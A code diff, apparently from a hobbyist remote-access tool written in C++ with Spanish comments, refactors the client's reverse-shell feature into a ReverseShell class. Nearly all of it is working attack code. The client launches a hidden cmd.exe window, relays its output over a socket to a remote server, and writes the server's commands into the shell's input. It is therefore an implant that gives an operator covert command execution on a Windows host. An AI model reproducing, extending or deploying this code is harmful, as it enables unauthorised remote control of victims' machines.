@@ -109,8 +109,35 @@ void Cliente::ProcesarComando(std::vector<std::string> strIn) {
         iEnviado = this->cSend(this->sckSocket, strTest.c_str(), strTest.size(), 0, false);
     }
 
-    if (strIn[0] == "RSHELL") {
-        this->SpawnShell("C:\\Windows\\System32\\cmd.exe");
+    //Iniciar shell
+    if (atoi(strIn[0].c_str()) == EnumComandos::Reverse_Shell_Start) {
+        this->reverseSHELL = new ReverseShell(this);
+        this->reverseSHELL->sckSocket = this->sckSocket;
+        this->reverseSHELL->SpawnShell("C:\\Windows\\System32\\cmd.exe");        
+    }
+
+    //Escribir comando a la shell
+    if (atoi(strIn[0].c_str()) == EnumComandos::Reverse_Shell_Command) {
+        if (this->reverseSHELL) {
+            std::string strJoined = "";
+            for (int i = 1; i < int(strIn.size()); i++) {
+                strJoined += strIn[i] + "~";
+            }
+            strJoined = strJoined.substr(0, strJoined.size() - 1);
+
+            this->reverseSHELL->thEscribirShell(strJoined);
+
+            if (strJoined == "exit\r\n") {
+                if (this->reverseSHELL) {
+                    this->reverseSHELL->TerminarShell();
+                    delete this->reverseSHELL;
+                    this->reverseSHELL = nullptr;
+                }
+#ifdef ___DEBUG_
+                std::cout << "Shell eliminada :v\n";
+#endif
+            }
+        }
     }
 
 #ifdef ___DEBUG_
@@ -277,86 +304,92 @@ ByteArray Cliente::bDec(const unsigned char* pInput, size_t pLen) {
 }
 
 //Reverse shell
-void Cliente::SpawnShell(const std::string pstrComando) {
+
+bool ReverseShell::SpawnShell(const char* pstrComando) {
 #ifdef ___DEBUG_
     std::cout << "Lanzando " << pstrComando << "\n";
 #endif
-    PROCESS_INFORMATION pi;
-    HANDLE stdinRd, stdinWr, stdoutRd, stdoutWr;
-    stdinRd = stdinWr = stdoutRd = stdoutWr = nullptr;
+    
+    this->stdinRd = this->stdinWr = this->stdoutRd = this->stdoutWr = nullptr;
     SECURITY_ATTRIBUTES sa;
     sa.nLength = sizeof(SECURITY_ATTRIBUTES);
     sa.lpSecurityDescriptor = nullptr;
     sa.bInheritHandle = true;
-    if (!CreatePipe(&stdinRd, &stdinWr, &sa, 0) || !CreatePipe(&stdoutRd, &stdoutWr, &sa, 0)) {
+    if (!CreatePipe(&this->stdinRd, &this->stdinWr, &sa, 0) || !CreatePipe(&this->stdoutRd, &this->stdoutWr, &sa, 0)) {
 #ifdef ___DEBUG_
         std::cout << "Error creando tuberias\n";
         error();
 #endif
-        return;
+        return false;
     }
     STARTUPINFO si;
     GetStartupInfo(&si);
     si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
     si.wShowWindow = SW_HIDE;
-    si.hStdOutput = stdoutWr;
-    si.hStdError = stdoutWr;
-    si.hStdInput = stdinRd;
-    char cCmd[1024];
-    ZeroMemory(cCmd, sizeof(cCmd));
-    strncpy(cCmd, pstrComando.c_str(), 1024);
-    if (CreateProcess(nullptr, cCmd, nullptr, nullptr, true, CREATE_NEW_CONSOLE, nullptr, nullptr, &si, &pi) == 0) {
+    si.hStdOutput = this->stdoutWr;
+    si.hStdError = this->stdoutWr;
+    si.hStdInput = this->stdinRd;
+
+    if (CreateProcess(nullptr, (LPSTR)pstrComando, nullptr, nullptr, true, CREATE_NEW_CONSOLE, nullptr, nullptr, &si, &this->pi) == 0) {
 #ifdef ___DEBUG_
         std::cout << "No se pudo spawnear la shell\n";
         error();
 #endif
-        return;
+        return false;
     }
     
     //La shell esta corriendo
-    this->isShellRunning = true;
-    this->cSend(this->sckSocket, "04\\Corriendo...", 16, 0, false);
-
-    std::thread tRead(&Cliente::thLeerShell, this, stdoutRd);
-    std::thread tWrite(&Cliente::thEscribirShell, this, stdinWr);
-    tRead.join();
-    tWrite.join();
+    this->isRunning = true;
+    if (this->copy_ptr != nullptr) {
+        this->copy_ptr->cSend(this->sckSocket, "04\\Corriendo...", 16, 0, false);
+    }
     
-    //La shell termino, enviar codigo a server
-    this->cSend(this->sckSocket, "05\\Done, omar :v", 17, 0, false);
-
-    TerminateProcess(pi.hProcess, 0);
-    if (stdinRd != nullptr) {
-        CloseHandle(stdinRd);
-        stdinRd = nullptr;
-    }
-    if (stdinWr != nullptr) {
-        CloseHandle(stdinWr);
-        stdinWr = nullptr;
-    }
-    if (stdoutRd != nullptr) {
-        CloseHandle(stdoutRd);
-        stdoutRd = nullptr;
-    }
-    if (stdoutWr != nullptr) {
-        CloseHandle(stdoutWr);
-        stdoutWr = nullptr;
-    }
-
-    this->isShellRunning = false;
+    this->tRead = std::thread(&ReverseShell::thLeerShell, this, stdoutRd);
+    
+    return true;
 }
 
-void Cliente::thLeerShell(HANDLE hPipe) {
+void ReverseShell::TerminarShell() {
+    
+    std::unique_lock<std::mutex> lock(this->mutex_shell);
+    this->isRunning = false;
+    lock.unlock();
+
+    if (this->tRead.joinable()) {
+        this->tRead.join();
+    }
+
+    this->copy_ptr->cSend(this->sckSocket, "05\\Done... omar :v", 19, 0, false);
+
+    TerminateProcess(this->pi.hProcess, 0);
+    if (this->stdinRd != nullptr) {
+        CloseHandle(this->stdinRd);
+        this->stdinRd = nullptr;
+    }
+    if (this->stdinWr != nullptr) {
+        CloseHandle(this->stdinWr);
+        this->stdinWr = nullptr;
+    }
+    if (this->stdoutRd != nullptr) {
+        CloseHandle(this->stdoutRd);
+        this->stdoutRd = nullptr;
+    }
+    if (this->stdoutWr != nullptr) {
+        CloseHandle(this->stdoutWr);
+        this->stdoutWr = nullptr;
+    }
+}
+
+void ReverseShell::thLeerShell(HANDLE hPipe) {
     //int iLen = 0; , iRet = 0;
     char cBuffer[256], cBuffer2[256 * 2 + 30];
     DWORD dBytesReaded = 0, dBufferC = 0, dBytesToWrite = 0;
     BYTE bPChar = 0;
-    while (this->isShellRunning) {
+    while (this->isRunning) {
         if (PeekNamedPipe(hPipe, cBuffer, sizeof(cBuffer), &dBytesReaded, nullptr, nullptr)) {
             if (dBytesReaded > 0) {
                 ReadFile(hPipe, cBuffer, sizeof(cBuffer), &dBytesReaded, nullptr);
-            }
-            else {
+            }else {
                 Sleep(100);
                 continue;
             }
@@ -371,20 +404,20 @@ void Cliente::thLeerShell(HANDLE hPipe) {
             std::string strOut = "06\\";
             strOut += cBuffer2;
 
-            int iEnviado = this->cSend(this->sckSocket, strOut.c_str(), strOut.size(), 0, false);
+            int iEnviado = this->copy_ptr->cSend(this->sckSocket, strOut.c_str(), strOut.size(), 0, false);
             Sleep(10);
             if (iEnviado <= 0) {
                 //Desconectado o se perdio la conexion
-                std::unique_lock<std::mutex> lock(this->mtx_shell);
-                this->isShellRunning = false;
+                std::unique_lock<std::mutex> lock(this->mutex_shell);
+                this->isRunning = false;
                 lock.unlock();
                 break;
             }
 
         }else {
             //error peeknamedpipe
-            std::unique_lock<std::mutex> lock(this->mtx_shell);
-            this->isShellRunning = false;
+            std::unique_lock<std::mutex> lock(this->mutex_shell);
+            this->isRunning = false;
             lock.unlock();
             break;
         }
@@ -395,34 +428,22 @@ void Cliente::thLeerShell(HANDLE hPipe) {
 #endif
 }
 
-void Cliente::thEscribirShell(HANDLE hPipe) {
-    //int iRet = 0;
-    char cRecvBytes[4096];
-    DWORD dBytesWrited = 0;
-    while (this->isShellRunning) {
-        ZeroMemory(cRecvBytes, sizeof(cRecvBytes));
-        int iRecibido = this->cRecv(this->sckSocket, cRecvBytes, sizeof(cRecvBytes), 0, false);
-
-        std::string strIn = cRecvBytes;
-        if (strIn == "exit\r\n") {
-            std::unique_lock<std::mutex> lock(this->mtx_shell);
-            this->isShellRunning = false;
-            lock.unlock();
-            break;
-        }
-        if (!WriteFile(hPipe, cRecvBytes, iRecibido, &dBytesWrited, nullptr)) {
-#ifdef ___DEBUG_
-            std::cout << "Error escribiendo a la tuberia\n-DATA: " << cRecvBytes << std::endl;
-            error();
-#endif
-            std::unique_lock<std::mutex> lock(this->mtx_shell);
-            this->isShellRunning = false;
-            lock.unlock();
-            break;
-        }
+void ReverseShell::thEscribirShell(std::string pStrInput) {
+    if (pStrInput == "exit\r\n") {
+        std::unique_lock<std::mutex> lock(this->mutex_shell);
+        this->isRunning = false;
+        lock.unlock();
     }
+
+    DWORD dBytesWrited = 0;
+    //stdinWr tuberia de entrada
+    if (!WriteFile(this->stdinWr, pStrInput.c_str(), pStrInput.size(), &dBytesWrited, nullptr)) {
 #ifdef ___DEBUG_
-    std::cout << "[!]thEscribirShell finalizada\n";
-    error();
+        std::cout << "Error escribiendo a la tuberia\n-DATA: " << pStrInput << std::endl;
+        error();
 #endif
+        std::unique_lock<std::mutex> lock(this->mutex_shell);
+        this->isRunning = false;
+        lock.unlock();
+    }
 }
